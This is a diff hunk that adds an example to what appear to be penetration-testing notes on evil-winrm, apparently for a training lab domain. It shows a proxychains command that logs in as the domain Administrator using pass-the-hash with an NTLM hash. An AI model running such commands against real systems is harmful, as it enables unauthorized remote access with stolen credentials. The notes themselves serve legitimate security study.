@@ -39,6 +39,11 @@ menu
 # To use them, just run it on the terminal
 ```
 
+Another example: combined with proxychains and pass the hash technique:
+
+```
+proxychains evil-winrm -i 172.16.5.5 -u INLANEFREIGHT.LOCAL\\Administrator -H 88ad09182de639ccc6579eb0849751cf
+```
 
 
 
